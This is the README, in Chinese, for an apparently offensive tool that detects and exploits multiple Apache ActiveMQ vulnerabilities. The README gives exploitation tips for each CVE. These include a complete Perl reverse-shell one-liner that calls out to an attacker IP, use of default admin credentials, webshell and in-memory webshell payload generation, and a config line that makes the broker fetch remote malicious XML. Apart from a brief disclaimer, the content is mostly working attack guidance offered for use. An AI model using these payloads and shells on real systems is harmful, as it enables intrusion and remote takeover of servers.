# ActiveMQ-EXPtools

支持检测和利用Apache ActiveMQ漏洞，CVE-2015-5254，CVE-2016-3088，CVE-2022-41678，CVE-2023-46604，CVE-2024-32114，CVE-2026-34197，CVE-2026-40466

![image-20260420111234916](./images/1.png)

> [!WARNING]
> 本工具仅供安全研究和学习使用。使用者需自行承担因使用此工具产生的所有法律及相关责任。请确保你的行为符合当地的法律和规定。作者不承担任何责任。如不接受，请勿使用此工具。

jdk8启动，Openwire默认端口61616，有时目标环境可能没有开放。apache activemq默认用户名密码admin:admin。BeanXML设置面板可生成执行对应命令的恶意的xml。有问题欢迎提Issue。

漏洞检测时可以将恶意XML服务器地址设置为dnslog，若收到请求，说明可能存在CVE-2023-46604，CVE-2026-34197，CVE-2026-40466

## 部分漏洞利用注意事项

### CVE-2015-5254

java-chains生成反序列化数据，验证漏洞时可以用URLDNS

在反弹shell时最好用perl，sh和bash有时弹不了

```bash
/usr/bin/perl -e 'use Socket;$i="192.168.239.129";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![image-20260420110252750](./images/2.png)

### CVE-2022-41678

自定义webshell写入时，冰蝎马写入会报500，哥斯拉正常。工具连接时注意要加上认证头部

### CVE-2026-34197/CVE-2026-40466

1.4版本不再集成内存马生成模块MemShellParty，一方面是fatjar包臃肿，另一方面是springbeanxmlclassloader需要用到的base64解码方法在不同java版本下并不通用，导致工具需要重复造轮子。有内存马需求的师傅可以参考下面生成xml的流程：

首先在MemShellParty生成对应内存马base64字符串https://party.mem.mk/ui

![image-20260508110638599](./images/4.png)

然后来到java-chains，找到Generate-OtherPayload，选择自定义字节码

![0](./images/3.png)

根据jdk版本选择base64解码方法，默认为decodeFromString方法，而vulhub中的CVE-2026-34197靶场需要选择java.util.Base64

最后填入内存马Base64字符串，点击生成即可

![image-20260508110858921](./images/5.png)

Filter，Listener或Servlet类型，在内存马连接地址处需要加上路径/admin/，/api/，以及认证头部，handler无需路径以及认证头部字段

CVE-2026-40466利用时注意还需要创建/discovery-registry/default文件，内容为`vm://evil?brokerConfig=xbean:http://192.168.239.129:8081/poc.xml`

**致谢**

https://github.com/URJACK2025/CVE-2022-41678

https://github.com/vulhub/vulhub

https://github.com/ReaJason/MemShellParty

https://github.com/1diot9/MyJavaSecStudy/blob/5504868a7cba4bf674fe6974fe8f613e556e5d42/Apache/ActiveMQ/CVE-2026-40466/poc/CVE-2026-40466_HTTP_Discovery_RCE_Analysis.md

https://github.com/vulhub/java-chains
